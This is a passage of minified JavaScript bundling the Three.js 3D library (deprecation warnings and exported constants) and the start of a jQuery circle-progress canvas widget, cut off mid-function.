removed.")}},shadowMapWidth:{set:function(t){console.warn("THREE.Light: .shadowMapWidth is now .shadow.mapSize.width."),this.shadow.mapSize.width=t}},shadowMapHeight:{set:function(t){console.warn("THREE.Light: .shadowMapHeight is now .shadow.mapSize.height."),this.shadow.mapSize.height=t}}}),Object.defineProperties(C.prototype,{length:{get:function(){return console.warn("THREE.BufferAttribute: .length has been deprecated. Use .count instead."),this.array.length}},copyIndicesArray:function(){console.error("THREE.BufferAttribute: .copyIndicesArray() has been removed.")}}),Object.assign(F.prototype,{addIndex:function(t){console.warn("THREE.BufferGeometry: .addIndex() has been renamed to .setIndex()."),this.setIndex(t)},addDrawCall:function(t,e,i){void 0!==i&&console.warn("THREE.BufferGeometry: .addDrawCall() no longer supports indexOffset."),console.warn("THREE.BufferGeometry: .addDrawCall() is now .addGroup()."),this.addGroup(t,e)},clearDrawCalls:function(){console.warn("THREE.BufferGeometry: .clearDrawCalls() is now .clearGroups()."),this.clearGroups()},computeTangents:function(){console.warn("THREE.BufferGeometry: .computeTangents() has been removed.")},computeOffsets:function(){console.warn("THREE.BufferGeometry: .computeOffsets() has been removed.")}}),Object.defineProperties(F.prototype,{drawcalls:{get:function(){return console.error("THREE.BufferGeometry: .drawcalls has been renamed to .groups."),this.groups}},offsets:{get:function(){return console.warn("THREE.BufferGeometry: .offsets has been renamed to .groups."),this.groups}}}),Object.assign(Vi.prototype,{getArrays:function(){console.error("THREE.ExtrudeBufferGeometry: .getArrays() has been removed.")},addShapeList:function(){console.error("THREE.ExtrudeBufferGeometry: .addShapeList() has been removed.")},addShape:function(){console.error("THREE.ExtrudeBufferGeometry: .addShape() has been removed.")}}),Object.defineProperties(qr.prototype,{dynamic:{set:function(){console.warn("THREE.Uniform: .dynamic has been removed. Use object.onBeforeRender() instead.")}},onUpdate:{value:function(){return console.warn("THREE.Uniform: .onUpdate() has been removed. Use object.onBeforeRender() instead."),this}}}),Object.defineProperties(T.prototype,{wrapAround:{get:function(){console.warn("THREE.Material: .wrapAround has been removed.")},set:function(){console.warn("THREE.Material: .wrapAround has been removed.")}},overdraw:{get:function(){console.warn("THREE.Material: .overdraw has been removed.")},set:function(){console.warn("THREE.Material: .overdraw has been removed.")}},wrapRGB:{get:function(){return console.warn("THREE.Material: .wrapRGB has been removed."),new b}},shading:{get:function(){console.error("THREE."+this.type+": .shading has been removed. Use the boolean .flatShading instead.")},set:function(t){console.warn("THREE."+this.type+": .shading has been removed. Use the boolean .flatShading instead."),this.flatShading=1===t}}}),Object.defineProperties(mn.prototype,{metal:{get:function(){return console.warn("THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead."),!1},set:function(){console.warn("THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead")}}}),Object.defineProperties(Y.prototype,{derivatives:{get:function(){return console.warn("THREE.ShaderMaterial: .derivatives has been moved to .extensions.derivatives."),this.extensions.derivatives},set:function(t){console.warn("THREE. ShaderMaterial: .derivatives has been moved to .extensions.derivatives."),this.extensions.derivatives=t}}}),Object.assign(Ne.prototype,{clearTarget:function(t,e,i,n){console.warn("THREE.WebGLRenderer: .clearTarget() has been deprecated. Use .setRenderTarget() and .clear() instead."),this.setRenderTarget(t),this.clear(e,i,n)},animate:function(t){console.warn("THREE.WebGLRenderer: .animate() is now .setAnimationLoop()."),this.setAnimationLoop(t)},getCurrentRenderTarget:function(){return console.warn("THREE.WebGLRenderer: .getCurrentRenderTarget() is now .getRenderTarget()."),this.getRenderTarget()},getMaxAnisotropy:function(){return console.warn("THREE.WebGLRenderer: .getMaxAnisotropy() is now .capabilities.getMaxAnisotropy()."),this.capabilities.getMaxAnisotropy()},getPrecision:function(){return console.warn("THREE.WebGLRenderer: .getPrecision() is now .capabilities.precision."),this.capabilities.precision},resetGLState:function(){return console.warn("THREE.WebGLRenderer: .resetGLState() is now .state.reset()."),this.state.reset()},supportsFloatTextures:function(){return console.warn("THREE.WebGLRenderer: .supportsFloatTextures() is now .extensions.get( 'OES_texture_float' )."),this.extensions.get("OES_texture_float")},supportsHalfFloatTextures:function(){return console.warn("THREE.WebGLRenderer: .supportsHalfFloatTextures() is now .extensions.get( 'OES_texture_half_float' )."),this.extensions.get("OES_texture_half_float")},supportsStandardDerivatives:function(){return console.warn("THREE.WebGLRenderer: .supportsStandardDerivatives() is now .extensions.get( 'OES_standard_derivatives' )."),this.extensions.get("OES_standard_derivatives")},supportsCompressedTextureS3TC:function(){return console.warn("THREE.WebGLRenderer: .supportsCompressedTextureS3TC() is now .extensions.get( 'WEBGL_compressed_texture_s3tc' )."),this.extensions.get("WEBGL_compressed_texture_s3tc")},supportsCompressedTexturePVRTC:function(){return console.warn("THREE.WebGLRenderer: .supportsCompressedTexturePVRTC() is now .extensions.get( 'WEBGL_compressed_texture_pvrtc' )."),this.extensions.get("WEBGL_compressed_texture_pvrtc")},supportsBlendMinMax:function(){return console.warn("THREE.WebGLRenderer: .supportsBlendMinMax() is now .extensions.get( 'EXT_blend_minmax' )."),this.extensions.get("EXT_blend_minmax")},supportsVertexTextures:function(){return console.warn("THREE.WebGLRenderer: .supportsVertexTextures() is now .capabilities.vertexTextures."),this.capabilities.vertexTextures},supportsInstancedArrays:function(){return console.warn("THREE.WebGLRenderer: .supportsInstancedArrays() is now .extensions.get( 'ANGLE_instanced_arrays' )."),this.extensions.get("ANGLE_instanced_arrays")},enableScissorTest:function(t){console.warn("THREE.WebGLRenderer: .enableScissorTest() is now .setScissorTest()."),this.setScissorTest(t)},initMaterial:function(){console.warn("THREE.WebGLRenderer: .initMaterial() has been removed.")},addPrePlugin:function(){console.warn("THREE.WebGLRenderer: .addPrePlugin() has been removed.")},addPostPlugin:function(){console.warn("THREE.WebGLRenderer: .addPostPlugin() has been removed.")},updateShadowMap:function(){console.warn("THREE.WebGLRenderer: .updateShadowMap() has been removed.")},setFaceCulling:function(){console.warn("THREE.WebGLRenderer: .setFaceCulling() has been removed.")},allocTextureUnit:function(){console.warn("THREE.WebGLRenderer: .allocTextureUnit() has been removed.")},setTexture:function(){console.warn("THREE.WebGLRenderer: .setTexture() has been removed.")},setTexture2D:function(){console.warn("THREE.WebGLRenderer: .setTexture2D() has been removed.")},setTextureCube:function(){console.warn("THREE.WebGLRenderer: .setTextureCube() has been removed.")},getActiveMipMapLevel:function(){return console.warn("THREE.WebGLRenderer: .getActiveMipMapLevel() is now .getActiveMipmapLevel()."),this.getActiveMipmapLevel()}}),Object.defineProperties(Ne.prototype,{shadowMapEnabled:{get:function(){return this.shadowMap.enabled},set:function(t){console.warn("THREE.WebGLRenderer: .shadowMapEnabled is now .shadowMap.enabled."),this.shadowMap.enabled=t}},shadowMapType:{get:function(){return this.shadowMap.type},set:function(t){console.warn("THREE.WebGLRenderer: .shadowMapType is now .shadowMap.type."),this.shadowMap.type=t}},shadowMapCullFace:{get:function(){console.warn("THREE.WebGLRenderer: .shadowMapCullFace has been removed. Set Material.shadowSide instead.")},set:function(){console.warn("THREE.WebGLRenderer: .shadowMapCullFace has been removed. Set Material.shadowSide instead.")}},context:{get:function(){return console.warn("THREE.WebGLRenderer: .context has been removed. Use .getContext() instead."),this.getContext()}}}),Object.defineProperties(Ce.prototype,{cullFace:{get:function(){console.warn("THREE.WebGLRenderer: .shadowMap.cullFace has been removed. Set Material.shadowSide instead.")},set:function(){console.warn("THREE.WebGLRenderer: .shadowMap.cullFace has been removed. Set Material.shadowSide instead.")}},renderReverseSided:{get:function(){console.warn("THREE.WebGLRenderer: .shadowMap.renderReverseSided has been removed. Set Material.shadowSide instead.")},set:function(){console.warn("THREE.WebGLRenderer: .shadowMap.renderReverseSided has been removed. Set Material.shadowSide instead.")}},renderSingleSided:{get:function(){console.warn("THREE.WebGLRenderer: .shadowMap.renderSingleSided has been removed. Set Material.shadowSide instead.")},set:function(){console.warn("THREE.WebGLRenderer: .shadowMap.renderSingleSided has been removed. Set Material.shadowSide instead.")}}}),Object.defineProperties(K.prototype,{activeCubeFace:{set:function(){console.warn("THREE.WebGLRenderTargetCube: .activeCubeFace has been removed. It is now the second parameter of WebGLRenderer.setRenderTarget().")}},activeMipMapLevel:{set:function(){console.warn("THREE.WebGLRenderTargetCube: .activeMipMapLevel has been removed. It is now the third parameter of WebGLRenderer.setRenderTarget().")}}}),Object.defineProperties(l.prototype,{wrapS:{get:function(){return console.warn("THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS."),this.texture.wrapS},set:function(t){console.warn("THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS."),this.texture.wrapS=t}},wrapT:{get:function(){return console.warn("THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT."),this.texture.wrapT},set:function(t){console.warn("THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT."),this.texture.wrapT=t}},magFilter:{get:function(){return console.warn("THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter."),this.texture.magFilter},set:function(t){console.warn("THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter."),this.texture.magFilter=t}},minFilter:{get:function(){return console.warn("THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter."),this.texture.minFilter},set:function(t){console.warn("THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter."),this.texture.minFilter=t}},anisotropy:{get:function(){return console.warn("THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy."),this.texture.anisotropy},set:function(t){console.warn("THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy."),this.texture.anisotropy=t}},offset:{get:function(){return console.warn("THREE.WebGLRenderTarget: .offset is now .texture.offset."),this.texture.offset},set:function(t){console.warn("THREE.WebGLRenderTarget: .offset is now .texture.offset."),this.texture.offset=t}},repeat:{get:function(){return console.warn("THREE.WebGLRenderTarget: .repeat is now .texture.repeat."),this.texture.repeat},set:function(t){console.warn("THREE.WebGLRenderTarget: .repeat is now .texture.repeat."),this.texture.repeat=t}},format:{get:function(){return console.warn("THREE.WebGLRenderTarget: .format is now .texture.format."),this.texture.format},set:function(t){console.warn("THREE.WebGLRenderTarget: .format is now .texture.format."),this.texture.format=t}},type:{get:function(){return console.warn("THREE.WebGLRenderTarget: .type is now .texture.type."),this.texture.type},set:function(t){console.warn("THREE.WebGLRenderTarget: .type is now .texture.type."),this.texture.type=t}},generateMipmaps:{get:function(){return console.warn("THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps."),this.texture.generateMipmaps},set:function(t){console.warn("THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps."),this.texture.generateMipmaps=t}}}),Object.defineProperties(ze.prototype,{standing:{set:function(){console.warn("THREE.WebVRManager: .standing has been removed.")}},userHeight:{set:function(){console.warn("THREE.WebVRManager: .userHeight has been removed.")}}}),kr.prototype.load=function(t){console.warn("THREE.Audio: .load has been deprecated. Use THREE.AudioLoader instead.");var e=this;return(new Lr).load(t,(function(t){e.setBuffer(t)})),this},Fr.prototype.getData=function(){return console.warn("THREE.AudioAnalyser: .getData() is now .getFrequencyData()."),this.getFrequencyData()},J.prototype.updateCubeMap=function(t,e){return console.warn("THREE.CubeCamera: .updateCubeMap() is now .update()."),this.update(t,e)},Oa.crossOrigin=void 0,Oa.loadTexture=function(t,e,i,n){console.warn("THREE.ImageUtils.loadTexture has been deprecated. Use THREE.TextureLoader() instead.");var r=new Un;return r.setCrossOrigin(this.crossOrigin),t=r.load(t,i,void 0,n),e&&(t.mapping=e),t},Oa.loadTextureCube=function(t,e,i,n){console.warn("THREE.ImageUtils.loadTextureCube has been deprecated. Use THREE.CubeTextureLoader() instead.");var r=new jn;return r.setCrossOrigin(this.crossOrigin),t=r.load(t,i,void 0,n),e&&(t.mapping=e),t},Oa.loadCompressedTexture=function(){console.error("THREE.ImageUtils.loadCompressedTexture has been removed. Use THREE.DDSLoader instead.")},Oa.loadCompressedTextureCube=function(){console.error("THREE.ImageUtils.loadCompressedTextureCube has been removed. Use THREE.DDSLoader instead.")},t.ACESFilmicToneMapping=5,t.AddEquation=100,t.AddOperation=2,t.AdditiveBlending=2,t.AlphaFormat=1021,t.AlwaysDepth=1,t.AlwaysStencilFunc=519,t.AmbientLight=yr,t.AmbientLightProbe=Ir,t.AnimationClip=In,t.AnimationLoader=Bn,t.AnimationMixer=Wr,t.AnimationObjectGroup=Ur,t.AnimationUtils=pl,t.ArcCurve=qn,t.ArrayCamera=Oe,t.ArrowHelper=ba,t.Audio=kr,t.AudioAnalyser=Fr,t.AudioContext=Al,t.AudioListener=Nr,t.AudioLoader=Lr,t.AxesHelper=wa,t.AxisHelper=function(t){return console.warn("THREE.AxisHelper has been renamed to THREE.AxesHelper."),new wa(t)},t.BackSide=1,t.BasicDepthPacking=3200,t.BasicShadowMap=0,t.BinaryTextureLoader=function(t){return console.warn("THREE.BinaryTextureLoader has been renamed to THREE.DataTextureLoader."),new Hn(t)},t.Bone=Xe,t.BooleanKeyframeTrack=En,t.BoundingBoxHelper=function(t,e){return console.warn("THREE.BoundingBoxHelper has been deprecated. Creating a THREE.BoxHelper instead."),new va(t,e)},t.Box2=Qr,t.Box3=m,t.Box3Helper=ya,t.BoxBufferGeometry=W,t.BoxGeometry=V,t.BoxHelper=va,t.BufferAttribute=C,t.BufferGeometry=F,t.BufferGeometryLoader=Mr,t.ByteType=1010,t.Cache=fl,t.Camera=$,t.CameraHelper=ma,t.CanvasRenderer=function(){console.error("THREE.CanvasRenderer has been removed")},t.CanvasTexture=ni,t.CatmullRomCurve3=Yn,t.CineonToneMapping=4,t.CircleBufferGeometry=hn,t.CircleGeometry=cn,t.ClampToEdgeWrapping=1001,t.Clock=Dr,t.ClosedSplineCurve3=_a,t.Color=b,t.ColorKeyframeTrack=Cn,t.CompressedTexture=ii,t.CompressedTextureLoader=Fn,t.ConeBufferGeometry=ln,t.ConeGeometry=sn,t.CubeCamera=J,t.CubeGeometry=V,t.CubeReflectionMapping=301,t.CubeRefractionMapping=302,t.CubeTexture=vt,t.CubeTextureLoader=jn,t.CubeUVReflectionMapping=306,t.CubeUVRefractionMapping=307,t.CubicBezierCurve=Kn,t.CubicBezierCurve3=Qn,t.CubicInterpolant=_n,t.CullFaceBack=1,t.CullFaceFront=2,t.CullFaceFrontBack=3,t.CullFaceNone=0,t.Curve=Vn,t.CurvePath=ar,t.CustomBlending=5,t.CylinderBufferGeometry=on,t.CylinderGeometry=an,t.Cylindrical=Kr,t.DataTexture=Q,t.DataTexture2DArray=yt,t.DataTexture3D=xt,t.DataTextureLoader=Hn,t.DecrementStencilOp=7683,t.DecrementWrapStencilOp=34056,t.DefaultLoadingManager=ml,t.DepthFormat=1026,t.DepthStencilFormat=1027,t.DepthTexture=ri,t.DirectionalLight=vr,t.DirectionalLightHelper=fa,t.DirectionalLightShadow=gr,t.DiscreteInterpolant=Sn,t.DodecahedronBufferGeometry=vi,t.DodecahedronGeometry=gi,t.DoubleSide=2,t.DstAlphaFactor=206,t.DstColorFactor=208,t.DynamicBufferAttribute=function(t,e){return console.warn("THREE.DynamicBufferAttribute has been removed. Use new THREE.BufferAttribute().setDynamic( true ) instead."),new C(t,e).setDynamic(!0)},t.EdgesGeometry=rn,t.EdgesHelper=function(t,e){return console.warn("THREE.EdgesHelper has been removed. Use THREE.EdgesGeometry instead."),new Ze(new rn(t.geometry),new Ye({color:void 0!==e?e:16777215}))},t.EllipseCurve=Wn,t.EqualDepth=4,t.EqualStencilFunc=514,t.EquirectangularReflectionMapping=303,t.EquirectangularRefractionMapping=304,t.Euler=u,t.EventDispatcher=e,t.ExtrudeBufferGeometry=Vi,t.ExtrudeGeometry=Ui,t.Face3=S,t.Face4=function(t,e,i,n,r,a,o){return console.warn("THREE.Face4 has been removed. A THREE.Face3 will be created instead."),new S(t,e,i,r,a,o)},t.FaceColors=1,t.FaceNormalsHelper=pa,t.FileLoader=kn,t.FlatShading=1,t.Float32Attribute=function(t,e){return console.warn("THREE.Float32Attribute has been removed. Use new THREE.Float32BufferAttribute() instead."),new D(t,e)},t.Float32BufferAttribute=D,t.Float64Attribute=function(t,e){return console.warn("THREE.Float64Attribute has been removed. Use new THREE.Float64BufferAttribute() instead."),new N(t,e)},t.Float64BufferAttribute=N,t.FloatType=1015,t.Fog=Be,t.FogExp2=ke,t.Font=Cr,t.FontLoader=Ar,t.FrontFaceDirectionCCW=1,t.FrontFaceDirectionCW=0,t.FrontSide=0,t.Frustum=et,t.GammaEncoding=3007,t.Geometry=U,t.GeometryUtils={merge:function(t,e,i){if(console.warn("THREE.GeometryUtils: .merge() has been moved to Geometry. Use geometry.merge( geometry2, matrix, materialIndexOffset ) instead."),e.isMesh){e.matrixAutoUpdate&&e.updateMatrix();var n=e.matrix;e=e.geometry}t.merge(e,n,i)},center:function(t){return console.warn("THREE.GeometryUtils: .center() has been moved to Geometry. Use geometry.center() instead."),t.center()}},t.GreaterDepth=6,t.GreaterEqualDepth=5,t.GreaterEqualStencilFunc=518,t.GreaterStencilFunc=516,t.GridHelper=ha,t.Group=Re,t.HalfFloatType=1016,t.HemisphereLight=cr,t.HemisphereLightHelper=la,t.HemisphereLightProbe=Or,t.IcosahedronBufferGeometry=mi,t.IcosahedronGeometry=fi,t.ImageBitmapLoader=Tr,t.ImageLoader=Gn,t.ImageUtils=Oa,t.ImmediateRenderObject=ea,t.IncrementStencilOp=7682,t.IncrementWrapStencilOp=34055,t.InstancedBufferAttribute=_r,t.InstancedBufferGeometry=wr,t.InstancedInterleavedBuffer=Xr,t.Int16Attribute=function(t,e){return console.warn("THREE.Int16Attribute has been removed. Use new THREE.Int16BufferAttribute() instead."),new R(t,e)},t.Int16BufferAttribute=R,t.Int32Attribute=function(t,e){return console.warn("THREE.Int32Attribute has been removed. Use new THREE.Int32BufferAttribute() instead."),new I(t,e)},t.Int32BufferAttribute=I,t.Int8Attribute=function(t,e){return console.warn("THREE.Int8Attribute has been removed. Use new THREE.Int8BufferAttribute() instead."),new A(t,e)},t.Int8BufferAttribute=A,t.IntType=1013,t.InterleavedBuffer=Fe,t.InterleavedBufferAttribute=He,t.Interpolant=wn,t.InterpolateDiscrete=2300,t.InterpolateLinear=2301,t.InterpolateSmooth=2302,t.InvertStencilOp=5386,t.JSONLoader=function(){console.error("THREE.JSONLoader has been removed.")},t.KeepStencilOp=7680,t.KeyframeTrack=Tn,t.LOD=Ve,t.LatheBufferGeometry=Qi,t.LatheGeometry=Ki,t.Layers=d,t.LensFlare=function(){console.error("THREE.LensFlare has been moved to /examples/js/objects/Lensflare.js")},t.LessDepth=2,t.LessEqualDepth=3,t.LessEqualStencilFunc=515,t.LessStencilFunc=513,t.Light=lr,t.LightProbe=Rr,t.LightProbeHelper=ca,t.LightShadow=hr,t.Line=$e,t.Line3=ta,t.LineBasicMaterial=Ye,t.LineCurve=tr,t.LineCurve3=er,t.LineDashedMaterial=bn,t.LineLoop=Je,t.LinePieces=1,t.LineSegments=Ze,t.LineStrip=0,t.LinearEncoding=3e3,t.LinearFilter=1006,t.LinearInterpolant=Mn,t.LinearMipMapLinearFilter=1008,t.LinearMipMapNearestFilter=1007,t.LinearMipmapLinearFilter=1008,t.LinearMipmapNearestFilter=1007,t.LinearToneMapping=1,t.Loader=Nn,t.LoaderUtils=_l,t.LoadingManager=Dn,t.LogLuvEncoding=3003,t.LoopOnce=2200,t.LoopPingPong=2202,t.LoopRepeat=2201,t.LuminanceAlphaFormat=1025,t.LuminanceFormat=1024,t.MOUSE={LEFT:0,MIDDLE:1,RIGHT:2,ROTATE:0,DOLLY:1,PAN:2},t.Material=T,t.MaterialLoader=br,t.Math=Ca,t.Matrix3=a,t.Matrix4=h,t.MaxEquation=104,t.Mesh=H,t.MeshBasicMaterial=E,t.MeshDepthMaterial=Te,t.MeshDistanceMaterial=Ee,t.MeshFaceMaterial=function(t){return console.warn("THREE.MeshFaceMaterial has been removed. Use an Array instead."),t},t.MeshLambertMaterial=yn,t.MeshMatcapMaterial=xn,t.MeshNormalMaterial=vn,t.MeshPhongMaterial=mn,t.MeshPhysicalMaterial=fn,t.MeshStandardMaterial=pn,t.MeshToonMaterial=gn,t.MinEquation=103,t.MirroredRepeatWrapping=1002,t.MixOperation=1,t.MultiMaterial=function(t){return void 0===t&&(t=[]),console.warn("THREE.MultiMaterial has been removed. Use an Array instead."),t.isMultiMaterial=!0,t.materials=t,t.clone=function(){return t.slice()},t},t.MultiplyBlending=4,t.MultiplyOperation=0,t.NearestFilter=1003,t.NearestMipMapLinearFilter=1005,t.NearestMipMapNearestFilter=1004,t.NearestMipmapLinearFilter=1005,t.NearestMipmapNearestFilter=1004,t.NeverDepth=0,t.NeverStencilFunc=512,t.NoBlending=0,t.NoColors=0,t.NoToneMapping=0,t.NormalBlending=1,t.NotEqualDepth=7,t.NotEqualStencilFunc=517,t.NumberKeyframeTrack=An,t.Object3D=p,t.ObjectLoader=Sr,t.ObjectSpaceNormalMap=1,t.OctahedronBufferGeometry=pi,t.OctahedronGeometry=di,t.OneFactor=201,t.OneMinusDstAlphaFactor=207,t.OneMinusDstColorFactor=209,t.OneMinusSrcAlphaFactor=205,t.OneMinusSrcColorFactor=203,t.OrthographicCamera=mr,t.PCFShadowMap=1,t.PCFSoftShadowMap=2,t.ParametricBufferGeometry=si,t.ParametricGeometry=oi,t.Particle=function(t){return console.warn("THREE.Particle has been renamed to THREE.Sprite."),new je(t)},t.ParticleBasicMaterial=function(t){return console.warn("THREE.ParticleBasicMaterial has been renamed to THREE.PointsMaterial."),new Ke(t)},t.ParticleSystem=function(t,e){return console.warn("THREE.ParticleSystem has been renamed to THREE.Points."),new Qe(t,e)},t.ParticleSystemMaterial=function(t){return console.warn("THREE.ParticleSystemMaterial has been renamed to THREE.PointsMaterial."),new Ke(t)},t.Path=or,t.PerspectiveCamera=Z,t.Plane=tt,t.PlaneBufferGeometry=at,t.PlaneGeometry=rt,t.PlaneHelper=xa,t.PointCloud=function(t,e){return console.warn("THREE.PointCloud has been renamed to THREE.Points."),new Qe(t,e)},t.PointCloudMaterial=function(t){return console.warn("THREE.PointCloudMaterial has been renamed to THREE.PointsMaterial."),new Ke(t)},t.PointLight=fr,t.PointLightHelper=oa,t.Points=Qe,t.PointsMaterial=Ke,t.PolarGridHelper=ua,t.PolyhedronBufferGeometry=ci,t.PolyhedronGeometry=li,t.PositionalAudio=Br,t.PositionalAudioHelper=da,t.PropertyBinding=jr,t.PropertyMixer=Hr,t.QuadraticBezierCurve=ir,t.QuadraticBezierCurve3=nr,t.Quaternion=n,t.QuaternionKeyframeTrack=Pn,t.QuaternionLinearInterpolant=Ln,t.REVISION="108",t.RGBADepthPacking=3201,t.RGBAFormat=1023,t.RGBA_ASTC_10x10_Format=37819,t.RGBA_ASTC_10x5_Format=37816,t.RGBA_ASTC_10x6_Format=37817,t.RGBA_ASTC_10x8_Format=37818,t.RGBA_ASTC_12x10_Format=37820,t.RGBA_ASTC_12x12_Format=37821,t.RGBA_ASTC_4x4_Format=37808,t.RGBA_ASTC_5x4_Format=37809,t.RGBA_ASTC_5x5_Format=37810,t.RGBA_ASTC_6x5_Format=37811,t.RGBA_ASTC_6x6_Format=37812,t.RGBA_ASTC_8x5_Format=37813,t.RGBA_ASTC_8x6_Format=37814,t.RGBA_ASTC_8x8_Format=37815,t.RGBA_PVRTC_2BPPV1_Format=35843,t.RGBA_PVRTC_4BPPV1_Format=35842,t.RGBA_S3TC_DXT1_Format=33777,t.RGBA_S3TC_DXT3_Format=33778,t.RGBA_S3TC_DXT5_Format=33779,t.RGBDEncoding=3006,t.RGBEEncoding=3002,t.RGBEFormat=1023,t.RGBFormat=1022,t.RGBM16Encoding=3005,t.RGBM7Encoding=3004,t.RGB_ETC1_Format=36196,t.RGB_PVRTC_2BPPV1_Format=35841,t.RGB_PVRTC_4BPPV1_Format=35840,t.RGB_S3TC_DXT1_Format=33776,t.RawShaderMaterial=dn,t.Ray=y,t.Raycaster=Yr,t.RectAreaLight=xr,t.RectAreaLightHelper=sa,t.RedFormat=1028,t.ReinhardToneMapping=2,t.RepeatWrapping=1e3,t.ReplaceStencilOp=7681,t.ReverseSubtractEquation=102,t.RingBufferGeometry=Ji,t.RingGeometry=Zi,t.Scene=f,t.SceneUtils={createMultiMaterialObject:function(){console.error("THREE.SceneUtils has been moved to /examples/js/utils/SceneUtils.js")},detach:function(){console.error("THREE.SceneUtils has been moved to /examples/js/utils/SceneUtils.js")},attach:function(){console.error("THREE.SceneUtils has been moved to /examples/js/utils/SceneUtils.js")}},t.ShaderChunk=vs,t.ShaderLib=xs,t.ShaderMaterial=Y,t.ShadowMaterial=un,t.Shape=sr,t.ShapeBufferGeometry=en,t.ShapeGeometry=tn,t.ShapePath=Er,t.ShapeUtils=cl,t.ShortType=1011,t.Skeleton=qe,t.SkeletonHelper=aa,t.SkinnedMesh=We,t.SmoothShading=2,t.Sphere=v,t.SphereBufferGeometry=$i,t.SphereGeometry=Yi,t.Spherical=Jr,t.SphericalHarmonics3=Pr,t.SphericalReflectionMapping=305,t.Spline=Sa,t.SplineCurve=rr,t.SplineCurve3=Ma,t.SpotLight=dr,t.SpotLightHelper=na,t.SpotLightShadow=ur,t.Sprite=je,t.SpriteMaterial=Ge,t.SrcAlphaFactor=204,t.SrcAlphaSaturateFactor=210,t.SrcColorFactor=202,t.StereoCamera=zr,t.StringKeyframeTrack=Rn,t.SubtractEquation=101,t.SubtractiveBlending=3,t.TOUCH={ROTATE:0,PAN:1,DOLLY_PAN:2,DOLLY_ROTATE:3},t.TangentSpaceNormalMap=0,t.TetrahedronBufferGeometry=ui,t.TetrahedronGeometry=hi,t.TextBufferGeometry=Xi,t.TextGeometry=qi,t.Texture=o,t.TextureLoader=Un,t.TorusBufferGeometry=Mi,t.TorusGeometry=_i,t.TorusKnotBufferGeometry=wi,t.TorusKnotGeometry=bi,t.Triangle=x,t.TriangleFanDrawMode=2,t.TriangleStripDrawMode=1,t.TrianglesDrawMode=0,t.TubeBufferGeometry=xi,t.TubeGeometry=yi,t.UVMapping=300,t.Uint16Attribute=function(t,e){return console.warn("THREE.Uint16Attribute has been removed. Use new THREE.Uint16BufferAttribute() instead."),new O(t,e)},t.Uint16BufferAttribute=O,t.Uint32Attribute=function(t,e){return console.warn("THREE.Uint32Attribute has been removed. Use new THREE.Uint32BufferAttribute() instead."),new z(t,e)},t.Uint32BufferAttribute=z,t.Uint8Attribute=function(t,e){return console.warn("THREE.Uint8Attribute has been removed. Use new THREE.Uint8BufferAttribute() instead."),new L(t,e)},t.Uint8BufferAttribute=L,t.Uint8ClampedAttribute=function(t,e){return console.warn("THREE.Uint8ClampedAttribute has been removed. Use new THREE.Uint8ClampedBufferAttribute() instead."),new P(t,e)},t.Uint8ClampedBufferAttribute=P,t.Uncharted2ToneMapping=3,t.Uniform=qr,t.UniformsLib=ys,t.UniformsUtils=us,t.UnsignedByteType=1009,t.UnsignedInt248Type=1020,t.UnsignedIntType=1014,t.UnsignedShort4444Type=1017,t.UnsignedShort5551Type=1018,t.UnsignedShort565Type=1019,t.UnsignedShortType=1012,t.VSMShadowMap=3,t.Vector2=i,t.Vector3=r,t.Vector4=s,t.VectorKeyframeTrack=On,t.Vertex=function(t,e,i){return console.warn("THREE.Vertex has been removed. Use THREE.Vector3 instead."),new r(t,e,i)},t.VertexColors=2,t.VertexNormalsHelper=ia,t.VideoTexture=ei,t.WebGLMultisampleRenderTarget=c,t.WebGLRenderTarget=l,t.WebGLRenderTargetCube=K,t.WebGLRenderer=Ne,t.WebGLUtils=Pe,t.WireframeGeometry=ai,t.WireframeHelper=function(t,e){return console.warn("THREE.WireframeHelper has been removed. Use THREE.WireframeGeometry instead."),new Ze(new ai(t.geometry),new Ye({color:void 0!==e?e:16777215}))},t.WrapAroundEnding=2402,t.XHRLoader=function(t){return console.warn("THREE.XHRLoader has been renamed to THREE.FileLoader."),new kn(t)},t.ZeroCurvatureEnding=2400,t.ZeroFactor=200,t.ZeroSlopeEnding=2401,t.ZeroStencilOp=0,t.sRGBEncoding=3001,Object.defineProperty(t,"__esModule",{value:!0})})),function(t){if("function"==typeof define&&define.amd)define(["jquery"],t);else if("object"==typeof module&&module.exports){var e=require("jquery");t(e),module.exports=e}else t(jQuery)}((function(t){function e(t){this.init(t)}e.prototype={value:0,size:100,startAngle:-Math.PI,thickness:"auto",fill:{gradient:["#3aeabb","#fdd250"]},emptyFill:"rgba(0, 0, 0, .1)",animation:{duration:1200,easing:"circleProgressEasing"},animationStartValue:0,reverse:!1,lineCap:"butt",insertMode:"prepend",constructor:e,el:null,canvas:null,ctx:null,radius:0,arcFill:null,lastFrameValue:0,init:function(e){t.extend(this,e),this.radius=this.size/2,this.initWidget(),this.initFill(),this.draw(),this.el.trigger("circle-inited")},initWidget:function(){this.canvas||(this.canvas=t("<canvas>")["prepend"==this.insertMode?"prependTo":"appendTo"](this.el)[0]);var e=this.canvas;if(e.width=this.size,e.height=this.size,this.ctx=e.getContext("2d"),window.devicePixelRatio>1){var i=window.devicePixelRatio;e.style.width=e.style.height=this.size+"px",e.width=e.height=this.size*i,this.ctx.scale(i,i)}},initFill:function(){function e(){var e=t("<canvas>")[0];e.width=n.size,e.height=n.size,e.getContext("2d").drawImage(i,0,0,o,o),n.arcFill=n.ctx.createPattern(e,"no-repeat"),n.drawFrame(n.lastFrameValue)}var i,n=this,r=this.fill,a=this.ctx,o=this.size;if(!r)throw Error("The fill is not specified!");if("string"==typeof r&&(r={color:r}),r.color&&(this.arcFill=r.color),r.gradient){var s=r.gradient;if(1==s.length)this.arcFill=s[0];else if(s.length>1){for(var l=r.gradientAngle||0,c=r.gradientDirection||[o/2*(1-Math.cos(l)),o/2*(1+Math.sin(l)),o/2*(1+Math.cos(l)),o/2*(1-Math.sin(l))],h=a.createLinearGradient.apply(a,c),u=0;u<s.length;u++){var 